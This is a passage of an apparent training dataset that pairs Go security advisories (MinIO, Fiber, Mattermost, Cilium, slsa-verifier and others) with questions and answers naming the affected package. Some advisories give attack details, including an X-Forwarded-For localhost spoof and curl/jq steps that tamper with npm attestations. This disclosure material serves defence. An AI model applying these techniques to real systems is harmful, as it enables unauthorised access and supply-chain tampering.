`N` is biprime or that it doesn't contain small factors. The fixed implementation adds the following proofs from the CGGMP21 threshold ECDSA protocol to the key generation:\n\n- Paillier-Blum Modulus (`N` is the product of two primes)\n- No Small Factor (both factors of `N` are greater than `2^256`)\n\nThese proofs apply to both the Paillier encryption modulus `N`, and the modulus `NTilde` used in MTA proofs.\n\nTo address the issue in the resharing protocol, an additional round has been added to the end so that participants can confirm that they received valid proofs.\n\n### References\n\n- [GG18](https://eprint.iacr.org/2019/114)\n- [CGGMP21](https://eprint.iacr.org/2021/060). Top 1 search result is go:github.com/cloudflare/cfrpki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/bnb-chain/tss-lib."}]}, {"id": "GHSA-2pxw-r47w-4p8c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nAn attacker can use crafted requests to bypass metadata bucket name checking and put an object into any bucket while processing `PostPolicyBucket`. To carry out this attack, the attacker requires credentials with `arn:aws:s3:::*` permission, as well as enabled Console API access.\n\n### Patches\n```\ncommit 67f4ba154a27a1b06e48bfabda38355a010dfca5\nAuthor: Aditya Manthramurthy <donatello@users.noreply.github.com>\nDate:   Sun Mar 19 21:15:20 2023 -0700\n\n    fix: post policy request security bypass (#16849)\n```\n\n### Workarounds\nBrowser API access must be enabled turning off `MINIO_BROWSER=off` allows for this workaround.\n\n### References\nThe vulnerable code:\n```go\n// minio/cmd/generic-handlers.go\nfunc setRequestValidityHandler(h http.Handler) http.Handler {\n  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n    // ...\n    // For all other requests reject access to reserved buckets\n    bucketName, _ := request2BucketObjectName(r)\n    if isMinioReservedBucket(bucketName) || isMinioMetaBucket(bucketName) {\n      if !guessIsRPCReq(r) && !guessIsBrowserReq(r) && !guessIsHealthCheckReq(r) && !guessIsMetricsReq(r) && !isAdminReq(r) && !isKMSReq(r) {\n        if ok {\n          tc.FuncName = \"handler.ValidRequest\"\n          tc.ResponseRecorder.LogErrBody = true\n        }\n        writeErrorResponse(r.Context(), w, errorCodes.ToAPIErr(ErrAllAccessDisabled), r.URL)\n        return\n      }\n    }\n    // ...\n```. Top 1 search result is go:github.com/elves/elvish. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/minio/minio."}]}, {"id": "GHSA-3q5p-3558-364f", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nThis vulnerability can be categorized as a security misconfiguration. It impacts users of our project who rely on the [ctx.IsFromLocal()](https://docs.gofiber.io/api/ctx#isfromlocal) method to restrict access to localhost requests. If exploited, it could allow unauthorized access to resources intended only for localhost.\n\nIn it's implementation it uses c.IPs():\n\n```go\n// IPs returns a string slice of IP addresses specified in the X-Forwarded-For request header.\n// When IP validation is enabled, only valid IPs are returned.\nfunc (c *Ctx) IPs() []string {\n    return c.extractIPsFromHeader(HeaderXForwardedFor)\n}\n```\n\nThereby, setting `X-Forwarded-For: 127.0.0.1` in a request from a foreign host, will result in true for [ctx.IsFromLocal()](https://docs.gofiber.io/api/ctx#isfromlocal) \n\n### Patches\nThis issue has been patched in `v2.49.2` with commit [b8c9ede6efa231116c4bd8bb9d5e03eac1cb76dc](https://github.com/gofiber/fiber/commit/b8c9ede6efa231116c4bd8bb9d5e03eac1cb76dc)\n\n### Workarounds\nCurrently, there are no known workarounds to remediate this vulnerability without upgrading to the patched version. We strongly advise users to apply the patch as soon as it is released.\n\n### References\nFor further information and context regarding this security issue, please refer to the following resources:\n\n- [Mozilla Developer Network - X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)\n\n. Top 1 search result is go:github.com/wal-g/wal-g. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/gofiber/fiber github.com/gofiber/fiber/v2."}]}, {"id": "GHSA-v84f-6r39-cpfc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: HashiCorp Vault and Vault Enterprise transit secrets engine allowed authorized users to specify arbitrary nonces, even with convergent encryption disabled. The encrypt endpoint, in combination with an offline attack, could be used to decrypt arbitrary ciphertext and potentially derive the authentication subkey when using transit secrets engine without convergent encryption. Introduced in 1.6.0 and fixed in 1.14.3, 1.13.7, and 1.12.11.. Top 1 search result is go:github.com/google/exposure-notifications-verification-server. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/vault github.com/hashicorp/vault github.com/hashicorp/vault."}]}, {"id": "GHSA-9hwp-cj7m-wjw4", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly validate the permissions when soft deleting a team allowing a team member to soft delete other teams that they are not part of\n\n. Top 1 search result is go:github.com/cloudflare/cfrpki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-23px-mw2p-46qm", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: **Component**: Cosmovisor\n**Criticality**: Medium\n**Affected Versions**: Cosmovisor < v1.0.0 (distributed with Cosmos-SDK < 0.46)\n**Affected Users**: Validators and Node operators utilizing unsupported versions of Cosmovisor\n**Impact**: DOS, potential RCE on node depending on configuration\n\n\nAn issue has been identified on unsupported versions of Cosmovisor which may result in a Denial of Service or Remote Code Execution path depending on configuration for a node or validator using the vulnerable version to manage their node. \n\nIf a validator is utilizing an affected version of Cosmovisor with `DAEMON_ALLOW_DOWNLOAD_BINARIES` set to true, a non-default configuration, it may be possible for an attacker to trigger a Remote Code Execution path as well on the host. In this configuration it is recommended to immediately stop use of the `DAEMON_ALLOW_DOWNLOAD_BINARIES` feature, and then proceed with an upgrade of Cosmovisor.\n\nIt is recommended that all validators utilizing unsupported versions of Cosmovisor to upgrade to the latest supported versions immediately.  If you are utilizing a forked version of Cosmos-SDK, it is recommended to stop use of Cosmovisor until it is possible to update to a supported version of Cosmovisor, whether through your project\u2019s fork, or directly compiled from the Cosmos-SDK. At the time of this advisory, the latest version of Cosmovisor is v1.5.0. \n\nAdditionally, the Amulet team recommends that developers building chains powered by Cosmos-SDK share this advisory with validators and node operators to ensure this information is available to all impacted parties within their ecosystems.\n\nFor more information about Cosmovisor, see https://docs.cosmos.network/main/tooling/cosmovisor\n\nThis issue was discovered by [Maxwell Dulin](https://maxwelldulin.com) and Nathan Kirkland, who reported it to the Cosmos Bug Bounty Program.  If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see [https://hackerone.com/cosmos](https://hackerone.com/cosmos).\n\n## How to tell if I am affected?\n\nRunning the following command will output whether your cosmovisor version is vulnerable to this issue or not.  \n\nVulnerable to this issue: \n\n```\nstrings ./cosmovisor | grep -q \"NEEDED at\" && echo \"vulnerable\" || echo \"NOT vulnerable\"\n\nvulnerable\n```\n\n\nNOT vulnerable to this issue:\n\n```\nstrings ./cosmovisor_new | grep -q \"NEEDED at\" && echo \"vulnerable\" || echo \"NOT vulnerable\"\n\nNOT vulnerable\n```\n\n\n*****\n\nA Note from Amulet on the Security Advisory Process\n\nIn the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.\n. Top 1 search result is go:github.com/evanphx/json-patch. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cosmos/cosmos-sdk."}]}, {"id": "GHSA-6jqw-jwf5-rp8h", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\nIn Argo CD versions prior to 2.3 (starting at least in v0.1.0, but likely in any version using Helm before 2.3), using a specifically-crafted Helm file could reference external Helm charts handled by the same repo-server to leak values, or files from the referenced Helm Chart. This was possible because Helm paths were predictable. \n\nThe vulnerability worked by adding a Helm chart that referenced Helm resources from predictable paths. Because the paths of Helm charts were predictable and available on an instance of repo-server, it was possible to reference and then render the values and resources from other existing Helm charts regardless of permissions. While generally, secrets are not stored in these files, it was nevertheless possible to reference any values from these charts. \n\n### Patches\nThis issue was fixed in Argo CD 2.3 and subsequent versions by randomizing Helm paths.\n\n### Workarounds\nUser's still using Argo CD 2.3 or below are advised to update to a [supported version](https://argo-cd.readthedocs.io/en/stable/operator-manual/installation/#supported-versions). If this is not possible, disabling Helm chart rendering, or using an additional repo-server for each Helm chart would prevent possible exploitation.  \n\n### References\nhttps://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n. Top 1 search result is go:github.com/kubernetes/kubernetes. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/argoproj/argo-cd github.com/argoproj/argo-cd/v2."}]}, {"id": "GHSA-h626-pv66-hhm7", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Terraform version 1.0.8 through 1.5.6 allows arbitrary file write during the `init` operation if run on maliciously crafted Terraform configuration. This vulnerability is fixed in Terraform 1.5.7.. Top 1 search result is go:github.com/schollz/rwtxt. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/hashicorp/terraform."}]}, {"id": "GHSA-gj2r-phwg-6rww", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nAn attacker with the ability to update pod labels can cause Cilium to apply incorrect network policies.\n\nThis issue arises due to the fact that on pod update, Cilium incorrectly uses user-provided pod labels to select the policies which apply to the workload in question.\n\nThis can affect:\n\n* Cilium network policies that use the namespace, service account or cluster constructs to restrict traffic\n* Cilium clusterwide network policies that use Cilium namespace labels to select the Pod\n* Kubernetes network policies\n\nNon-existent construct names can be provided, which bypass all network policies applicable to the construct. For example, providing a pod with a non-existent namespace as the value of the `io.kubernetes.pod.namespace` label results in none of the namespaced CiliumNetworkPolicies applying to the pod in question.\n\nThis attack requires the attacker to have [Kubernetes API Server access](https://docs.cilium.io/en/latest/security/threat-model/#kubernetes-api-server-attacker), as described in the Cilium Threat Model.\n\n### Patches\n\nThis issue affects:\n\n- Cilium <= v1.14.1\n- Cilium <= v1.13.6\n- Cilium <= v1.12.13\n\nThis issue has been resolved in:\n\n- Cilium v1.14.2\n- Cilium v1.13.7\n- Cilium v1.12.14\n\n### Workarounds\n\nAn admission webhook can be used to prevent pod label updates to the `k8s:io.kubernetes.pod.namespace` and `io.cilium.k8s.policy.*` keys.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Palantir and Isovalent to prepare these mitigations. Special thanks to @odinuge for reporting this issue and to @nebril for the fix.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nIf you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list \u2013 [security@cilium.io](mailto:security@cilium.io) \u2013 first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.. Top 1 search result is go:github.com/cloudflare/cfrpki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cilium/cilium github.com/cilium/cilium github.com/cilium/cilium."}]}, {"id": "GHSA-2hm9-h873-pgqh", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Overview\nOpenFGA is vulnerable to a DoS attack when certain Check calls are executed against authorization models that contain circular relationship definitions. When the call is made, it's possible for the server to exhaust resources and die.\n\n## Am I Affected?\nYes, if your store contains an authorization model that allows circular relationships. For example, with this model:\n\n```\nmodel\n  schema 1.1\n\ntype user\n\ntype group\n  relations\n    define memberA: [user] or memberB or memberC or memberD or memberE\n    define memberB: [user] or memberA or memberC or memberD or memberE\n    define memberC: [user] or memberA or memberB or memberD or memberE\n    define memberD: [user] or memberA or memberB or memberC or memberE\n    define memberE: [user] or memberA or memberB or memberC or memberD\n```\n\nThis Check: `(user:anne, memberA, group:X)` can exhaust memory in the server.\n\n## Fix\nUpgrade to v1.3.2 and update any offending models.\n\n  **[BREAKING]** If your model contained cycles or a relation definition that has the relation itself in its evaluation path, then Checks and queries that require evaluation will no longer be evaluated on v1.3.2+ and will return errors instead. You will need to update your models to remove the cycles.. Top 1 search result is go:github.com/ethereum/go-ethereum. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/openfga/openfga."}]}, {"id": "GHSA-h8wh-f7gw-fwpr", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly check permissions when retrieving a post allowing for\u00a0a System Role with the permission to manage channels to read the posts of a DM conversation.\n\n. Top 1 search result is go:github.com/edgexfoundry/app-functions-sdk-go. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-9xfq-8j3r-xp5g", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Consensys gnark-crypto through 0.11.2 allows Signature Malleability. This occurs because deserialisation of EdDSA and ECDSA signatures does not ensure that the data is in a certain interval.. Top 1 search result is go:github.com/containerd/containerd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/Consensys/gnark-crypto github.com/consensys/gnark-crypto."}]}, {"id": "GHSA-33r7-wjfc-7w98", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to enforce character limits in all possible notification props allowing an attacker to\u00a0send a really long value for a notification_prop resulting in the server consuming an abnormal quantity of computing resources and possibly becoming temporarily unavailable for its users. \n\n\n\n. Top 1 search result is go:github.com/go-ldap/ldap. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-ppjh-xp5v-46wc", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. A sender may send dangerous new files to a receiver, such as executable content or a `.ssh/authorized_keys` file. . Top 1 search result is go:github.com/cloudflare/cfrpki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc/v9."}]}, {"id": "GHSA-h69v-mvh9-hfrq", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly validate permissions when demoting and deactivating a user allowing for a\u00a0system/user manager to demote / deactivate another manager\n\n. Top 1 search result is go:github.com/cloudflare/cfrpki. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-8c8w-f7wp-2jr2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was discovered in Croc through 9.6.5. A sender can cause a receiver to overwrite files during ZIP extraction.. Top 1 search result is go:github.com/opencontainers/image-spec. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/schollz/croc."}]}, {"id": "GHSA-hq58-p9mv-338c", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ## Amulet Security Advisory for CometBFT: ASA-2023-002\n\n**Component**: CometBFT\n**Criticality:** Low\n**Affected versions:** All\n**Affected users:** Validators, Chain Builders + Maintainers\n\n# Summary\n\nA default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the `BlockParams.MaxBytes` consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the `timeout_propose` parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network\u2019s topography.\n\nWhen setting a large `BlockParams.MaxBytes`, there are two main implications:\n* Increased bandwidth to propagate a block\n* Increased latency to propagate a block\n\nWhen combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.\u00a0 The cost to propagate a 21MB block, the default value for `BlockParams.MaxBytes`, will be far higher than the cost of propagating a smaller 1MB block.\u00a0CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.\n\n# Considerations\nCometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.\n\n\n# Next Steps for Chains and Validators\n\nTo increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (https://github.com/cometbft/cometbft/pull/1405, [v0.34.x](https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes), [v0.37.x](https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes), [v0.38.x](https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes)) for builders and maintainers of chain applications. Additionally, it is recommended that:\n\n\n* Chain ecosystems and their maintainers set a `BlockParams.MaxBytes` configuration appropriate for their use case at the application level; in some cases, fine-tuning `BlockParams` may require a network upgrade.\n* Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.\n* Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.\n\n* All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.\n* All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.\n\n\nThe CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the `BlockParams.MaxBytes` limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (https://github.com/cometbft/cometbft/pull/1408), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the _next_ release of each branch of CometBFT.\n\nAs more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.\u00a0\n\n\nFor more information about CometBFT, see [https://docs.cometbft.com](https://docs.cometbft.com/). \n\n\n\n\n\nThis issue was raised by Notional labs, who reported it via the vulnerability disclosure channel at [security@interchain.io](mailto:security@interchain.io) on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see [https://hackerone.com/cosmos](https://hackerone.com/cosmos).\u00a0\n\n\n*****\n\n \nNote from Amulet on the Security Advisory Process:\n\n\nIn the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.. Top 1 search result is go:github.com/minio/console. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/cometbft/cometbft."}]}, {"id": "GHSA-c37r-v8jx-7cv2", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly limit the characters allowed in different fields of a block in Mattermost Boards allowing\u00a0a attacker to\u00a0consume excessive resources, possibly leading to Denial of Service, by\u00a0patching the field of a block using a specially crafted string.\u00a0\n\n. Top 1 search result is go:github.com/yi-ge/unzip. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-jjr7-372r-cx7x", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to check whether the\u00a0\"Allow users to view archived channels\"\u00a0setting is enabled during permalink previews display, allowing members to view permalink previews of archived channels even if the\u00a0\"Allow users to view archived channels\" setting is disabled.\u00a0\n\n. Top 1 search result is go:github.com/fluxcd/kustomize-controller. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-xvq6-h898-wcj8", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly validate requests to the Calls plugin, allowing an attacker sending a request without a User Agent header to cause a panic and crash the Calls plugin\n\n. Top 1 search result is go:github.com/pomerium/pomerium. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8."}]}, {"id": "GHSA-jj46-9cgh-qmfx", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to check if hardened mode is enabled when overriding the username and/or the icon when posting a post. If settings allowed integrations to override the username and profile picture when posting, a member could also override the username and icon when making a post even if the Hardened Mode setting was enabled\n\n. Top 1 search result is go:github.com/docker/distribution. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-3f2q-6294-fmq5", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: git-urls version 1.0.1 is vulnerable to ReDOS (Regular Expression Denial of Service) in Go package.. Top 1 search result is go:github.com/deislabs/oras. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/whilp/git-urls."}]}, {"id": "GHSA-r67m-mf7v-qp7j", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to properly sanitize the user object when updating the username, resulting in the password hash being included in the response body.\u00a0\n\n. Top 1 search result is go:github.com/beego/beego. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost-server/v6 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8."}]}, {"id": "GHSA-j4c3-3h73-74m9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: Mattermost fails to\u00a0limit the amount of data extracted from compressed archives during board import in Mattermost Boards\u00a0allowing an attacker to consume excessive resources, possibly leading to Denial of Service, by\u00a0importing a board using a specially crafted zip (zip bomb).\n\n. Top 1 search result is go:github.com/traefik/traefik. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost/server/v8 github.com/mattermost/mattermost-server/v6."}]}, {"id": "GHSA-qmvj-4qr9-v547", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\nA vulnerability was fond in Knative Serving that could allow an attacker to crash the Knative Serving autoscaler resulting in a denial of service. The attacker would need to have compromised one pod in the Knative Serving deployment, and with that position they could launch the attack against the autoscaler. \nWhen the autoscaler scrapes the metrics of pods, it sends a request to the `/metrics` endpoint of each pod and reads the response. The attacker would need to detect the request from the autoscaler to the `/metrics` endpoint of the pod they had compromised and send a malicious response back to the autoscaler. At this point, the autoscaler would crash. The root cause of the vulnerability was a memory exhaustion issue in the autoscaler that the attacker could trigger with the malicious reponse.\n\nThe vulnerability would allow a privilege escalation by the attacker from controlling one point to having negative impact on the entire Knative Serving deployment.\n\n### Impact\nAll users are vulnerable to this; Users that have not had any of their pods compromised are not at risk of this vulnerability.  \n\n### Mitigation\nThe vulnerability has been patched in v1.10.5, v1.11.3 and v1.12.0\n\n### Credits\nThe vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.. Top 1 search result is go:github.com/argoproj/argo-cd. What is the affected package?"}, {"from": "gpt", "value": "The affected package is knative.dev/serving."}]}, {"id": "GHSA-r2xv-vpr2-42m9", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Summary\n\n`slsa-verifier<=2.4.0` does not correctly verify npm's [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations signature.\n\n### Proof of concept\n\nSteps to reproduce:\n1. `curl -Sso attestations.json $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`\n2. `curl -Sso supreme-goggles.tgz \"$(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.tarball')\"`\n3. In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.\n   Here is an example command to replace the package name with `@attacker/malicious`:\n   `jq -r \".attestations[0].bundle.dsseEnvelope.payload = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\" < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n### Impact\n\nAn attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.\n\n### Patches\n\nFixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.\n\n### Workarounds\n\nThere is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)\n. Top 1 search result is go:github.com/hashicorp/vault. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/slsa-framework/slsa-verifier/v2 github.com/slsa-framework/slsa-verifier."}]}, {"id": "GHSA-3hfq-cx9j-923w", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: An issue was found in Kyverno that allowed an attacker to control the digest of images used by Kyverno users. The issue would require the attacker to compromise the registry that the Kyverno fetch their images from. The attacker could then return a vulnerable image to the the user and leverage that to further escalate their position. As such, the attacker would need to know which images the Kyverno user consumes and know of one of multiple exploitable vulnerabilities in previous digests of the images. Alternatively, if the attacker has compromised the registry, they could craft a malicious image with a different digest with intentionally placed vulnerabilities and deliver the image to the user. \n\nAn attacker was not be able to control other parameters of the image than the digest by exploiting this vulnerability.\n\nUsers pulling their images from trusted registries are not impacted by this vulnerability. There is no evidence of this being exploited in the wild.\n\nThe issue has been patched in 1.11.0. \n\nThe vulnerability was found during an ongoing security audit of Kyverno conducted by Ada Logics, facilitated by OSTIF and funded by the CNCF.\n\nMembers of the community have raised concerns over the similarity between this vulnerability and the one identified with CVE-2023-46737; They are two different issues with two different root causes and different levels of impact. Some differences are:\n\n- The current advisory (GHSA-3hfq-cx9j-923w) has its root cause in Kyverno whereas the root cause of CVE-2023-46737 is in Cosigns code base. \n- The impact of the current advisory (GHSA-3hfq-cx9j-923w) is that an attacker can trick Kyverno into consuming a different image than the one the user requested; The impact of CVE-2023-46737 is an endless data attack resulting in a denial-of-service.\n- The fix of the current advisory (GHSA-3hfq-cx9j-923w) does not result in users being secure from CVE-2023-46737 and vice versa.. Top 1 search result is go:github.com/argoproj/argo-workflows. What is the affected package?"}, {"from": "gpt", "value": "The affected package is github.com/kyverno/kyverno."}]}, {"id": "GHSA-7h8m-vrxx-vr4m", "conversations": [{"from": "human", "value": "Below is a Go vulnerability description. Please identify the software name affected by it. Input: ### Impact\n\nZITADEL provides administrators the possibility to define a `Lockout Policy` with a maximum amount of failed password check attempts. On every failed password check, the amount of failed checks is compared against the configured maximum.\nExceeding the limit, will lock the user and prevent further authentication.\n\nIn the affected implementation it was possible for an attacker to start multiple parallel password checks, giving him the possibility to try out more combinations than configured in the `Lockout Policy`.\n\n### Patches\n\n2.x versions are fixed on >= [2.40.5](https://github.com/zitadel/zitadel/releases/tag/v2.40.5)\n2.38.x versions are fixed on >= [2.38.3](https://github.com/zitadel/zitadel/releases/tag/v2.38.3)\n\n### Workarounds\n\nThere is no workaround since a patch is already available.\n\n### References\n\nNone\n\n### Questions\n\nIf you have any questions or comments about this advisory, please email us at [security@zitadel.com](mailto:security@zitadel.com)\n. Top 1 search result is go:github.com/istio/istio. What is the affected package?"}, {"from": 